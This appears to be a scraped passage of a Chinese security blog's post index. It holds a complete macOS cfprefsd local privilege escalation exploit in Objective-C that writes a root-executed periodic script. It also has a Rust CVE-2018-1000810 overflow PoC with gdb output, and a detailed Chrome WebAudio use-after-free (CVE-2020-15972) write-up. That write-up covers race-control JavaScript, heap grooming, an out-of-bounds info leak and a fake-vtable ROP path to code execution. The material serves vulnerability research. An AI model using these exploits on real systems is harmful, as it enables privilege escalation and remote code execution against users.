安装中，这个目录不存在。这意味着我们可以通过连接到cfprefsd守护程序服务并要求dameon将目录的所有权设置给我们的用户来创建此目录。创建此目录后，我们可以在那里创建我们的脚本（因为该位置将由用户拥有）并且该脚本将以 root 身份运行。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// gcc -framework Foundation cfprefsd_exploit.m -o cfprefsd_exploit#import &lt;Foundation/Foundation.h&gt;#include &lt;xpc/xpc.h&gt;#include &lt;sys/stat.h&gt;int main() { char *serviceName = &quot;com.apple.cfprefsd.daemon&quot;; int status = 0; xpc_connection_t conn; xpc_object_t msg; conn = xpc_connection_create_mach_service(serviceName, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED); if (conn == NULL) { perror(&quot;xpc_connection_create_mach_service&quot;); } xpc_connection_set_event_handler(conn, ^(xpc_object_t obj) { perror(&quot;xpc_connection_set_event_handler&quot;); }); xpc_connection_resume(conn); msg = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_int64(msg, &quot;CFPreferencesOperation&quot;, 1); xpc_dictionary_set_bool(msg, &quot;CFPreferencesUseCorrectOwner&quot;, true); //create as user xpc_dictionary_set_string(msg, &quot;CFPreferencesUser&quot;, &quot;kCFPreferencesCurrentUser&quot;); xpc_dictionary_set_string(msg, &quot;CFPreferencesHostBundleIdentifier&quot;, &quot;prefs&quot;); xpc_dictionary_set_string(msg, &quot;CFPreferencesDomain&quot;, &quot;/usr/local/etc/periodic/daily/a.plist&quot;); xpc_dictionary_set_string(msg, &quot;Key&quot;, &quot;key&quot;); xpc_dictionary_set_string(msg, &quot;Value&quot;, &quot;value&quot;); xpc_connection_send_message(conn, msg); usleep(1000000); NSString* script = @&quot;touch /Library/privesc.txt\\n&quot;; NSError *error; BOOL succeed = [script writeToFile:@&quot;/usr/local/etc/periodic/daily/111.lpe&quot; atomically:YES encoding:NSUTF8StringEncoding error:&amp;error]; if (!succeed){ printf(&quot;Couldn't create periodic script :(\\n&quot;); } char mode[] = &quot;0777&quot;; int i; i = strtol(mode, 0, 8); chmod(&quot;/usr/local/etc/periodic/daily/111.lpe&quot;,i);} 此漏洞利用将向以 root身份运行的cfprefsd守护进程发起 XPC 消息。这由服务名称com.apple.cfprefsd.daemon标识（用户模式守护进程被标识为com.apple.cfprefsd.agent）。守护进程将创建文件夹**/usr/local/etc/periodic/daily/然后将我们的脚本写入该位置，该位置将运行touch /Library/privesc.txt**。 如果需要，我们还可以在漏洞利用中使用以下行以 root 身份创建一个目录。 1xpc_dictionary_set_string(msg, &quot;CFPreferencesUser&quot;, &quot;root&quot;); 参考链接Compromising the macOS Kernel through Safari by Chaining Six Vulnerabilities","link":"/2021/12/15/Apple-cfprefsd%E6%BC%8F%E6%B4%9E/"},{"title":"CVE-2018-1000810 wildcopy exploit","text":"前言再看IOMFB_integer_overflow_poc一文，但是对于最后的wildcopy操作不是很理解，决定先来看看wildcopy是什么，以及怎么利用。 这篇文章讲的是CVE-2018-1000810，是在Rust标准库中发现的一个漏洞。这个错误是在 1.26.0 版本中引入的，并在 1.29.0 版本之后修复。 漏洞原理repeat函数的整数溢出导致内存访问错误，POC： 1fn main() { let _s = &quot;AAAA&quot;.repeat(0x4000000000000001); } 解释一下，POC中的repeat函数将会将0x4000000000000001*4（这里会导致溢出）字节的数据写入到4字节中。 在gdb中，可以看到： 12345678910111213141516171819202122232425262728293031(gdb) startTemporary breakpoint 1 at 0x6072: file src/main.rs, line 2.Starting program: /mnt/c/projects/rust/exploit/target/debug/exploit[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.Temporary breakpoint 1, exploit::main () at src/main.rs:22 let _s = &quot;AAAA&quot;.repeat(0xc000000000000001);(gdb) cContinuing.Program received signal SIGSEGV, Segmentation fault.__memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:249249 ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S: No such file or directory.(gdb) x/8i $rip=&gt; 0x7ffffe92eb1f &lt;__memmove_avx_unaligned_erms+79&gt;: rep movsb %ds:(%rsi),%es:(%rdi) 0x7ffffe92eb21 &lt;__memmove_avx_unaligned_erms+81&gt;: retq 0x7ffffe92eb22 &lt;__memmove_avx_unaligned_erms+82&gt;: cmp $0x10,%dl 0x7ffffe92eb25 &lt;__memmove_avx_unaligned_erms+85&gt;: jae 0x7ffffe92eb3e &lt;__memmove_avx_unaligned_erms+110&gt; 0x7ffffe92eb27 &lt;__memmove_avx_unaligned_erms+87&gt;: cmp $0x8,%dl 0x7ffffe92eb2a &lt;__memmove_avx_unaligned_erms+90&gt;: jae 0x7ffffe92eb53 &lt;__memmove_avx_unaligned_erms+131&gt; 0x7ffffe92eb2c &lt;__memmove_avx_unaligned_erms+92&gt;: cmp $0x4,%dl 0x7ffffe92eb2f &lt;__memmove_avx_unaligned_erms+95&gt;: jae 0x7ffffe92eb64 &lt;__memmove_avx_unaligned_erms+148&gt;(gdb) x/8gx $rsi0x7ffffe400000: 0x4141414141414141 0x41414141414141410x7ffffe400010: 0x4141414141414141 0x41414141414141410x7ffffe400020: 0x4141414141414141 0x41414141414141410x7ffffe400030: 0x4141414141414141 0x4141414141414141(gdb) x/8gx $rdi0x7ffffe600000: Cannot access memory at address 0x7ffffe600000(gdb) 漏洞利用思路如下： 先进行堆喷，用的是std::Vec，因为通过数组的值，可以实现任意读写； 触发漏洞，破坏其中一个的长度，根据这个长度，找到被破坏的数组下标； 通过被破坏的数组，找到子数组中包含感兴趣的值（0x7f0000000000）的数组下标，并记录该下标； 使用子数组再破坏父数组中的某个数组的长度； 找到父数组中长度被破坏的那个下标； 利用这两个被破坏的数组，实现任意读写； 写入shellcode，触发执行。","link":"/2022/01/05/CVE-2018-1000810-wildcopy-exploit/"},{"title":"Chrome CVE-2020-6449 UAF","text":"漏洞成因","link":"/2021/12/06/Chrome-CVE-2020-6449-UAF/"},{"title":"CVE-2020-15972 Chrome浏览器RCE","text":"漏洞原因 Chrome 的 WebAudio 组件中的UAF 影响范围 该错误已在 10 月份的 Chrome 86.0.4240.75版中修复。影响了 Chrome 85 稳定版的大部分。 原文链接：https://securitylab.github.com/research/one_day_short_of_a_fullchain_renderer/ 背景以前，网页对于音频的处理仅限于&lt;audio&gt;标签，能力十分有限，为了实现更高级的操作，W3C设计实现了WebAudio API，通过这些API，我们几乎可以完成一个专业的音频处理软件的构建。 WebAudio API可以实现： 实现高精度的音频计算。 音频混响器。 3D音频。 与&lt;audio&gt;/WebRTC的集成。 设计思路：类似于标准IO函数，从某个地方（input）读取一个音频流，经过实时计算处理后发送去某个地方（destination），这个处理过程是effect。 漏洞由于音频处理是一项计算密集型任务，它将在单独的音频线程上完成，以便不阻塞浏览器的响应。WebAudio中的音频输入以128帧为单位进行处理，称为quantum。一旦一个quantum开始处理，整个quantum就必须完成，这意味着所有的节点都必须处理这128帧，即使有些节点被主线程删除和收集垃圾。 在下面的情况中，convolver实际上不会被删除，因为每个节点都持有对它所连接的输出节点的引用。然而，如果我们断开节点的连接，则convolver可能会被删除，但音频图仍然在被处理。 1234567let soundSource1 = audioContext.createConstantSource();let convolver = audioContext.createConvolver();soundSource1.connect(convolver).connect(audioContext.destination);audioContext.startRendering(); //&lt;-------- start processing the audio graphsoundSource1.disconnect();convolver = null;gc(); 那么一个死去的节点如何继续处理音频数据呢？在WebAudio中，AudioNode实际上只是javascript的一个接口，实际的处理是由它拥有的AudioHandler处理的。当一个AudioNode被销毁时，它将使用IsPullingAudioGraph函数检查此刻是否正在处理一个quantum。 1234567891011121314151617181920212223void AudioNode::Dispose() { DCHECK(IsMainThread());#if DEBUG_AUDIONODE_REFERENCES fprintf(stderr, &quot;[%16p]: %16p: %2d: AudioNode::dispose %16p @%g\\n&quot;, context(), this, Handler().GetNodeType(), handler_.get(), context()-&gt;currentTime());#endif BaseAudioContext::GraphAutoLocker locker(context()); Handler().Dispose(); // 如果上下文被拉到音频图上，就把处理程序添加到孤儿列表中。 // 这将使处理程序保持运行，直到它可以在一个安全点（在处理程序任务的前/后）被删除。 // 如果图没有被拉动，我们现在就可以删除处理程序，因为音频线程上没有任何东西会接触到它。 DCHECK(context()); if (context()-&gt;IsPullingAudioGraph()) { context()-&gt;GetDeferredTaskHandler().AddRenderingOrphanHandler( std::move(handler_)); } // Notify the inspector that this node is going away. The actual clean up // will be done in the subclass implementation. ReportWillBeDestroyed();} 如果一个quantum正在被处理，它将把AudioHandler（handler_）的所有权转移到由AudioContext本身拥有的deferred_task_handler_。然后DeferredTaskHandler将确保AudioHandler保持运行，直到quantum的处理完成，然后清理孤儿AudioHandler。 然而，有一个例外。如果包含音频图的javascript框架被破坏了，例如，当包含图的iframe被破坏时，那么DeferredTaskHandler将在quantum仍在处理时立即进行清理，调用ClearHandlersToBeDeleted函数，这将删除孤儿AudioHandler（之前有一个信号量可以解决这个问题，但该信号量在这次commit中被删除了）。 控制竞争为了在竞争获取足够的时间，来操作AudioHandler，exp使用了AudioWorkletNode，AudioWorkletNode允许节点运行用户自定义的JavaScript代码，具体如下所示： 12345await audioContext.audioWorklet.addModule('tear-down.js');let worklet;worklet = new AudioWorkletNode(audioContext, 'tear-down');let convolver = audioContext.createConvolver();soundSource.connect(worklet).connect(convolver).connect(audioContext.destination); 可以在tear-down.js中使用sleep函数，这样就有足够的时间删除和替换ConvolverNode： 123456class AutoProcessor extends AudioWorkletProcessor { process (inputs, outputs, parameters) { sleep(5000); return true }} 删除ConvolverNode的例子如下（实际上，convolver需要运行在另一个不调用parent.removeFrame的函数的范围之内，这里只是举个例子）： 12345678910await audioContext.audioWorklet.addModule('tear-down.js');let worklet = new AudioWorkletNode(audioContext, 'tear-down');let convolver = audioContext.createConvolver();soundSource.connect(worklet).connect(convolver).connect(audioContext.destination);audioContext.startRendering();sleep(200);worklet.disconnect();convolver = null;gc();parent.removeFrame(); //&lt;-------- Get parent frame to delete outselves; 另一个有用的事实是，在这样做的时候，只有与所有输入断开连接的节点才会被删除，而与输入保持连接的节点即使在iframe被删除后也会保持活力，只有在处理完成后才会被删除。如下所示，当worklet完成处理时，convolver将保持运行直到gain结束为止： 123456789let convolver = audioContext.createConvolver();let gain = audioContext.createGain();soundSource.connect(worklet).connect(convolver).connect(gain).connect(audioContext.destination);audioContext.startRendering();sleep(200);convolver.disconnect();gain = null;gc();parent.removeFrame(); //&lt;-------- Get parent frame to delete outselves; 漏洞原语每个AudioHandler拥有一个音频节点的输入和输出的列表。 1234class MODULES_EXPORT AudioHandler : public ThreadSafeRefCounted&lt;AudioHandler&gt; { ... Vector&lt;std::unique_ptr&lt;AudioNodeInput&gt;&gt; inputs_; Vector&lt;std::unique_ptr&lt;AudioNodeOutput&gt;&gt; outputs_; AudioNodeInput（AudioSummingJunction的一个子类）也持有一个连接到它的输出列表： 123456789101112class AudioSummingJunction { ... // m_renderingOutputs is a copy of m_outputs which will never be modified // during the graph rendering on the audio thread. This is the list which // is used by the rendering code. // Whenever m_outputs is modified, the context is told so it can later // update m_renderingOutputs from m_outputs at a safe time. Most of the // time, m_renderingOutputs is identical to m_outputs. // These raw pointers are safe. Owner of this AudioSummingJunction has // strong references to owners of these AudioNodeOutput. Vector&lt;AudioNodeOutput*&gt; rendering_outputs_;}; AudioNodeOutput保留了一个与它相连的AudioNodeInput的列表： 1234567class MODULES_EXPORT AudioNodeOutput final { ... // This HashSet holds connection references. We must call // AudioNode::makeConnection when we add an AudioNodeInput to this, and must // call AudioNode::breakConnection() when we remove an AudioNodeInput from // this. HashSet&lt;AudioNodeInput*&gt; inputs_; 在下面的例子中，ConvolverHandler拥有一个AudioNodeInput和一个AudioNodeOutput，AudioNodeInput持有对worklet的AudioNodeOutput的引用，而AudioNodeOutput持有对gain的AudioNodeInput的引用。 1soundSource.connect(worklet).connect(convolver).connect(gain).connect(audioContext.destination); 当处理一个音频图时，代码实际上是从目的地开始向后传播，并调用AudioNodeInput::Pull，然后它将为每个连接到它的输出调用AudioNodeOutput::Pull。然后AudioNodeOutput::Pull调用拥有它的AudioHandler::ProcessIfNecessary，后者又会为它的输入调用AudioNodeInput::Pull，并将调用传播给连接到它的AudioHandler。这一直持续到没有输入的源节点，然后实际的处理将从调用AudioHandler::Process开始。在AudioHandler::Process完成后，它将通过AudioNodeOutput::Pull-&gt;AudioNodeInput::Pull-&gt;AudioHandler::PullInputs-&gt;AudioHandler::ProcessIfNecessary返回到下一个AudioHandler的AudioHandler::Process。下图以两个AudioHandler为例说明了这一点，下面的一个是AudioWorkletNode： 在上图中，每个大的矩形代表了对AudioHandler所拥有的对象的所有调用，里面的小矩形代表了被调用的函数。蓝色箭头代表控制流边缘，从一个AudioHandler跳到另一个。当用一个等待了很长时间的AudioWorkletHandler来触发UAF时，相关的跳转是在AudioHandler::Process完成之后，因为在那个时候，下一个AudioHandler会被删除和替换。在上图中，红色区域表示用对象进行的调用，这些对象在调用时将被删除。此时，代码将首先返回AudioWorkletHandler拥有的AudioNodeOutput::Pull，就在对ProcessIfNecessary的调用之后。下面是它随后将遵循的代码路径，以及一些利用的可能性。 当Process返回时，它首先会返回到AudioWorkletHandler的ProcessIfNecessary，然后是它所拥有的AudioNodeOutput::Pull。这时，这些对象都不会被删除（对应于图中左下角灰色框中AudioHandler::Process之后的蓝色箭头部分）。如果AudioNodeOutput::Pull是从AudioNodeInput::Pull，而不是AudioNodeInput::SumAllConnections中调用的，那么它将跳回到已释放的 AudioHandler::PullInputs，这意味着inputs_将在循环仍在迭代时被删除。 如果上面的inputs_的大小是一个开始，那么循环就会直接退出，而ProcessIfNecessary将从PullInputs之后继续。 123456789101112void AudioHandler::ProcessIfNecessary(uint32_t frames_to_process) { ... PullInputs(frames_to_process); ... bool silent_inputs = InputsAreSilent(); if (silent_inputs &amp;&amp; PropagatesSilence()) { SilenceOutputs(); ProcessOnlyAudioParams(frames_to_process); } else { UnsilenceOutputs(); Process(frames_to_process); } 这时，AudioHandler已经被释放了。根据InputsAreSilent的结果，虚函数PropagatesSilence或Process将被调用。 如果上一点中被删除的AudioHandler被另一个有效的AudioHandler替换了，这样虚拟函数的调用就不会崩溃，那么ProcessIfNecessary将返回到调用AudioNodeOutput::Pull。现在因为AudioNodeOutput和AudioHandler的大小不同，所以有可能AudioNodeOutput（在调用AudioNodeOutput::Pull）仍然被释放的情况下替换AudioHandler（堆栈/注册表仍然存储指向被释放对象的指针，而不是替换后的AudioHandler的AudioNodeOutput）。然后，AudioNodeOutput::Pull函数将调用Bus并返回一个指向该AudioNodeOutput拥有的AudioBus对象的指针。这意味着返回值也将被释放，指向的对象（AudioBus）可以被替换成受控数据。然而，这只在从AudioNodeInput::SumAllConnections调用AudioNodeOutput::Pull的路径中才有意义，因为通过AudioNodeInput::Pull的路径并不利用返回值。 虽然第二点可以通过伪造vtable来劫持控制流，但这需要有信息泄露来打败ASLR，并获得一个堆地址来存储假vtable，所以在这一点上我无法使用它。第一点有可能是非常强大的，因为它有可能让我用任何类型的指针向量来替换inputs_，导致AudioNodeInput和许多可能的类型之间的类型混淆。可以用一个简单的CodeQL查询来找到可能的类型。 信息泄露可选先看第三种可能，当通过SumAllConnections调用时，输出的返回值output，现在已经被释放了，被传递给SumFrom。 1234567891011void AudioNodeInput::SumAllConnections(scoped_refptr&lt;AudioBus&gt; summing_bus, uint32_t frames_to_process) { ... for (unsigned i = 0; i &lt; NumberOfRenderingConnections(); ++i) { ... AudioBus* connection_bus = output-&gt;Pull(nullptr, frames_to_process); // Sum, with unity-gain. summing_bus-&gt;SumFrom(*connection_bus, interpretation); }} 根据summing_bus和connection_bus之间的通道数量，可以采取各种路径。最简单的路径只是调用AudioChannel::SumFrom 123456789void AudioBus::SumFrom(const AudioBus&amp; source_bus, ChannelInterpretation channel_interpretation) { ... if (number_of_source_channels == number_of_destination_channels) { for (unsigned i = 0; i &lt; number_of_source_channels; ++i) Channel(i)-&gt;SumFrom(source_bus.Channel(i)); return; } AudioChannel::SumFrom简单地将source_bus, (connection_bus)中的数据复制到summing_bus，使用summing_bus的长度。 12345678910void AudioChannel::SumFrom(const AudioChannel* source_channel) { ... if (IsSilent()) { CopyFrom(source_channel); } else { //Copies using the length of `summing_bus` (`length()`) vector_math::Vadd(Data(), 1, source_channel-&gt;Data(), 1, MutableData(), 1, length()); }} 因此，如果可以用一个长度短于summing_bus的Bus来替换已释放的AudioNodeOutput，那么就可以得到一个越界的读取。通过安排堆，就可以利用这一点获得一个vtable和/或堆指针的地址，这将能够使用第二点中的虚拟函数调用原语来实现远程代码执行。 然而，有几个问题。首先，即使可以替换掉已释放的AudioNodeOutput，我仍然需要有一个有效的指向connection_bus的指针，这个指针是一个有效的AudioBus。一个简单的方法是用另一个有短总线的AudioNodeOutput替换AudioNodeOutput。不幸的是，所有AudioNodeOutput的Bus都是相同的长度（128），这是有道理的，否则会一直有越界的读写。另一种可能性是，由于Bus为AudioNodeOutput所有，可以直接替换Bus，而让AudioNodeOutput空出来。由于用于分配AudioNodeOutput和Bus的内存分配器PartitionAlloc是一个桶分配器，AudioNodeOutput的大小为104，而AudioBus的大小为32，通过分别操作这两个桶，可以在释放AudioNodeOutput的同时替换Bus。虽然PartitionAlloc会把释放对象的前8个字节弄乱作为额外的保护，但这并不影响AudioNodeOutput::Bus返回的指针，所以connection_bus仍然会指向用来替换的对象。如果用一个长度较短的对象替换Bus，那么就会得到一个信息泄露。 现在的问题是如何创建一个具有任意长度的AudioBus。看看对AudioBus::Create的各种调用，ConvolverHandler::SetBuffer中的调用看起来很有希望，因为它可以通过指定ConvolverNode的buffer字段从javascript中轻松到达。不幸的是，创建的AudioBus只是本地的，并且在函数调用结束后会被删除，这使得它很难使用。最后，WebAudioBus::Initialize中的那个函数效果更好，因为它可以通过javascript中的decodeAudioData函数达到，创建的AudioBus的长度由输入ArrayBuffer（包含一些音频数据）的大小控制。通过使用ffmpeg来创建不同长度的MP3文件，我能够使用这个函数来创建不同长度的AudioBus。 下一个问题更难解决。虽然可以造成越界读取，并将结果复制到summing_bus的backing store中，但由于几个原因，没有办法将这些数据读出来： 为了触发UAF，需要删除包含音频图的iframe，这意味着当越界读取发生时，所有的音频节点将无法到达，因此没有办法检索属于该图的AudioNodeInput的summing_bus中的数据。 如果summing_bus也被释放，那么也许可以用仍然可以到达的AudioNodeInput中的另一个AudioBus来代替它，然后也许有办法从该AudioNodeInput的summing_bus中读出数据。不幸的是，情况也不是这样的，因为summing_bus不是一个原始指针，而是一个共享所有权的scoped_refptr。 12345678void AudioNodeInput::SumAllConnections(scoped_refptr&lt;AudioBus&gt; summing_bus, uint32_t frames_to_process) { ... for (unsigned i = 0; i &lt; NumberOfRenderingConnections(); ++i) { ... summing_bus-&gt;SumFrom(*connection_bus, interpretation); }} 这意味着，即使现在所有的东西都被释放了，summing_bus仍将保持活力，至少在SumAllConnections调用完成之前，所以没有办法去替换summing_bus。 实际的方式 回到上一节第1点中的迭代器无效原语。如前所述，通过把一个接受多个输入的AudioNode，如ChannelMergerNode放在AudioWorkletNode之后，然后删除包含音频图的iframe来触发UAF，ChannelMergerNode和由此产生的inputs_将被删除，而AudioHandler::PullInputs的循环仍在迭代中： 12345void AudioHandler::PullInputs(uint32_t frames_to_process) { ... for (auto&amp; input : inputs_) input-&gt;Pull(nullptr, frames_to_process);} 在实践中，这意味着在完成input-&gt;Pull调用后，input迭代器将被递增，并指向现在被删除的input_的已释放backing store中的下一个位置。这将继续下去，直到达到input_的长度。因此，通过分配另一个与inputs_相同大小的Vector，我用新Vector的支持存储空间替换了已释放的backing store。虽然这可以用来造成类型混乱，并在许多不同类型的对象上调用AudioNodeInput::Pull，但应该用什么对象来替换AudioNodeInput并不明显。 将ChannelMergerNode换成另一个ChannelMergerNode，它运行在父帧的音频图上。因此，当这个错误触发时，它将继续运行另一个运行在父帧中的音频图。 下面的图展示了替换这个对象时会发生什么： 破折号边框和边表示如果子iframe没有被删除，将会被运行的节点和边，而绿色节点表示实际被运行的节点。在处理完子iframe的顶部分支后，该框架被删除，ChannelMergerNode被替换成父帧中的节点。这导致父帧中的音频图的底部分支被代替运行。 当删除一个AudioNode时会发生什么？正如前面解释的那样，当一个AudioNode被垃圾回收时，为了防止底层的AudioHandler被删除，而它还在被用来处理音频图，AudioNode将通过调用AudioContext的IsPullingAudioGraph方法来检查它所属的音频图是否正在被处理： 123456void AudioNode::Dispose() { ... if (context()-&gt;IsPullingAudioGraph()) { context()-&gt;GetDeferredTaskHandler().AddRenderingOrphanHandler( std::move(handler_)); } IsPullingAudioGraph检查音频图是否处于kRunning状态： 1234bool OfflineAudioContext::IsPullingAudioGraph() const { ... return ContextState() == BaseAudioContext::kRunning;} 并转移AudioHandler的所有权（如果它是）。然而，在这种情况下，因为父帧中的音频图正在作为子框架中的图的一部分被处理，音频图不会处于kRunning状态，因为它没有从父帧中启动。(在实际利用中，将不得不启动然后暂停图形以使节点相互连接，但这没有什么区别，因为图形将处于kSuspended状态，所以IsPullingAudioGraph检查仍将通过)这意味着AudioHandler的所有权转移将不会发生，它将在图形被处理时被删除。 这意味着可以在这个图中引起同样类型的UAF，而不需要删除包含它的框架。这一点很重要，因为之前试图获得信息泄露的主要问题是，所有的节点和包含它们的iframe都被删除了，所以没有办法检索到泄露的数据。但现在可以在不删除包含节点的框架的情况下导致UAF，将能够在UAF触发后访问它们，并能够读取泄露的数据。 获取信息泄露第一步，在一个子iframe中触发UAF，并使用循环迭代器无效原语，使音频图的一个分支在父帧中运行。 上图显示了将用于替换的实际图形。它由两个ScriptProcessorNode夹着一个GainNode组成。ScriptProcessorNode就像AudioWorkletNode，它允许运行用户提供的脚本来处理音频数据。然而，在ScriptProcessorNode的情况下，脚本是在dom窗口的上下文中运行的，它允许我访问AudioContext和各种节点，这使得使用ScriptProcessorNode进行开发更容易，exp将在父框架图中使用它而不是AudioWorkletNode。 第二步，在ScriptProcessorNode脚本2的音频处理脚本中，移除跟随它的GainNode，并对其进行垃圾回收，这样它的AudioInputNode和AudioOutputNode，就被释放了。 为了构建信息泄露，还需要替换被删除的GainNode，以防止虚函数调用崩溃，同时让它的AudioOutputNode保持自由。可以通过操纵堆来创建额外的释放的AudioOutputNode，这样当GainNode被释放时，它的AudioOutputNode就不会在free列表的首位，不会被替换。我通过创建一个额外的ChannelMergerNode来做到这一点。 12345678910111213141516function createSource() { let s = audioCtx.createChannelMerger(3);}// 第一个ScriptProcessorNode的音频处理器。function scriptProcess2(audioProcessingEvent) { // 需要为AudioOutputNode创建孔，使它们不会被回收。 createSource(); ... script2.disconnect(); //&lt;--- 移除GainNode的引用 gc(); //&lt;--- 首先删除GainNode, 然后在createSource中创建ChannelMergerNode // 需要等待GC分配的小对象被清除。 sleep(4000); let gain = audioCtx2.createGain(); //&lt;---- 替换gain以获取虚函数调用 let src0 = audioCtx2.createChannelMerger(1); //&lt;--- 为AudioBus安排堆栈 ...} 虽然对createSource的调用看起来是多余的，但是，在createSource中创建的ChannelMergerNode直到垃圾回收时才会被删除，到那时，它实际上会在GainNode之后被删除，在freelist的头部留下额外的AudioOutputNode。 当被删除的GainNode被另一个GainNode取代时，旧GainNode的已释放的AudioNodeOutput将不会被占用。这个被释放的GainNode将负责调用Bus并为我们提供一个被释放的AudioBus。 在图中，绿色箭头表示当另一个对象被删除时被释放的对象，红色箭头表示被创建的对象。 为了替换AudioNodeOutput拥有的大小为32的AudioBus，也需要对大小为32的桶进行操作。为此再次使用另一个ChannelMergerNode。 同时，还必须注意不要替换被删除的GainNode的AudioNodeOutput… 虽然有很多要求需要满足，而且AudioBus是从一个相当嘈杂的桶中分配的，但与其他情况不同的是，在其他情况下，堆经常被其他进程共享，而这些进程并不在我们的控制范围内，而渲染器在很大程度上是一个孤立的进程，完全拥有其堆。因此，只要脚本是从一个新的渲染器中运行的，就可以以非常精确和具体的方式进行渲染器堆的喷射（当从登录的上下文中点击一个链接时，如通过电子邮件或Twitter），所以这不会对漏洞的可靠性造成太大的问题。 一旦堆被放入正确的状态，使现在被删除的GainNode所拥有的AudioBus处于freelist的正确位置，AudioContext::decodeAudioData函数就可以用来创建一个适当长度的AudioBus来触发越界读取。这个函数接收一个音频文件的ArrayBuffer（例如mp3、ogg），并在后台线程中对其进行解码。它将创建一个具有适当长度的AudioBus来容纳解码后的结果。 123456789101112131415161718192021222324void AsyncAudioDecoder::DecodeOnBackgroundThread( DOMArrayBuffer* audio_data, float sample_rate, V8DecodeSuccessCallback* success_callback, V8DecodeErrorCallback* error_callback, ScriptPromiseResolver* resolver, BaseAudioContext* context, scoped_refptr&lt;base::SingleThreadTaskRunner&gt; task_runner) { ... scoped_refptr&lt;AudioBus&gt; bus = CreateBusFromInMemoryAudioFile( audio_data-&gt;Data(), audio_data-&gt;ByteLength(), false, sample_rate); //&lt;----- 创建AudioBus ... if (context) { PostCrossThreadTask( *task_runner, FROM_HERE, CrossThreadBindOnce(&amp;AsyncAudioDecoder::NotifyComplete, WrapCrossThreadPersistent(audio_data), WrapCrossThreadPersistent(success_callback), WrapCrossThreadPersistent(error_callback), WTF::RetainedRef(std::move(bus)), //&lt;------ 传入NotifyComplete WrapCrossThreadPersistent(resolver), WrapCrossThreadPersistent(context))); }} 然后，创建的AudioBus被作为主线程上的一个任务传递给NotifyComplete，并在NotifyComplete完成后被删除。 12345678910111213141516void AsyncAudioDecoder::NotifyComplete( DOMArrayBuffer*, V8DecodeSuccessCallback* success_callback, V8DecodeErrorCallback* error_callback, AudioBus* audio_bus, ScriptPromiseResolver* resolver, BaseAudioContext* context) { ... AudioBuffer* audio_buffer = AudioBuffer::CreateFromAudioBus(audio_bus); // If the context is available, let the context finish the notification. if (context) { context-&gt;HandleDecodeAudioData(audio_buffer, resolver, success_callback, error_callback); }} 由于AudioBus在这里只是一个临时对象，在解码完成后会被删除，所以需要确保它的寿命足够长，以便发生越界读取。为了做到这一点，可以使用javascript函数setInterval来干扰任务队列。当调用setInterval时，它会创建一个延迟的任务。这个任务以及DecodeOnBackgroundThread发布的NotifyComplete任务被发布到同一个任务队列中，在主线程上执行。通过用setInterval创建任务，我可以使NotifyComplete的运行出现延迟，因为在NotifyComplete之前发布的任何任务都必须在NotifyComplete之前运行，而且它们都必须在主线程上运行。这将允许在足够长的时间内保持AudioBus的活力，这样当AudioNodeInput::SumAllConnections导致越界读取时，在音频线程中使用这个AudioBus，它将仍然活着。 通过使用ffmpeg来创建一个无声的mp3文件，创建一个最小长度为47的AudioBus。由于来自AudioNodeInput的AudioBus的长度是128，而且AudioBus的后备存储是浮点格式，有16个大小的padding（Android为16，x86为32），这意味着可以使用界外读原语来读取大小在204和528之间的对象。CodeQL查询，可以用来识别这样的对象，并选择适当的文件长度来使用。 123456789101112class FastMallocClass extends Class { FastMallocClass() { exists(Operator op, Function fastMalloc | op.hasName(&quot;operator new&quot;) and fastMalloc.hasName(&quot;FastMalloc&quot;) and op.calls(fastMalloc) and op.getDeclaringType() = this.getABaseClass*() ) }}from FastMallocClass cwhere c.getSize() &lt;= 528 and c.getSize() &gt; 204select c, c.getLocation(), c.getSize() 在这里做了改进，只包括在FastMalloc分区中分配的对象，也就是分配AudioBus的备份存储（AudioArray）的地方。看了一下结果，BiquadDSPKernel特别有用。除了要泄露vtable之外，它还包含一个字段biquad_，存储了5个AudioDoubleArray。这意味着通过泄露BiquadDSPKernel类型的对象，就能同时泄露这些AudioDoubleArray的后备存储地址，然后可以用来存储一个假的vtable来劫持虚拟函数调用。 因此，通过安排堆，把BiquadDSPKernel放在AudioBus后面，然后触发bug导致越界读取，就能把BiquadDSPKernel对象泄漏到下一个AudioNodeInput的AudioBus中。为了读取输入数据，可以使用ScriptProcessorNode，它允许使用javascript函数来读取输入。然后，可以获得泄漏的vtable和各种AudioDoubleArray的地址。 RCE在这一点上，其余的利用方法是相当标准的。一旦获得了BiquadDSPKernel的vtable的地址，就可以用它来找到libchrome.so的偏移。有了libchrome.so的偏移量，就可以找到里面的ROP小工具的地址，并在属于BiquadDSPKernel的AudioDoubleArray中创建一个假的vtable，这样，这个假vtable中的虚拟函数指针就会指向所选择的小工具。 之后，自由使用后的漏洞就可以再一次被触发了。这一次，它直接进入漏洞的第二节Primitives中的路径，调用一个虚拟函数。被释放的AudioHandler对象现在可以被一个适当大小的AudioArray所取代，这个AudioArray被填充了受控数据，这样它的vtable就指向了在上面创建的假vtable。 使用类似于这篇文章中使用的小工具，调用OS::SetPermissions，将BiquadDSPKernel中的AudioDoubleArray的页面权限覆盖为rwx。一旦完成，就可以在这些AudioDoubleArray中放置shell代码，并再次触发这个bug来运行任意代码。在实际的漏洞中，一个延迟节点被用作免费的AudioHandler，IIRFilterNode的前馈系数被用来伪造DelayHandler。 完整的exp在这里。 总结在这篇文章中，我们再次看到，复杂的对象清理，加上多线程的微妙性，导致了WebAudio中的漏洞可以作为渲染器RCE来利用。虽然与v8中的漏洞相比，blink中的漏洞一般需要更多的时间来利用，但它仍然是Chrome中获得（沙盒）RCE的一个巨大而可行的攻击面。 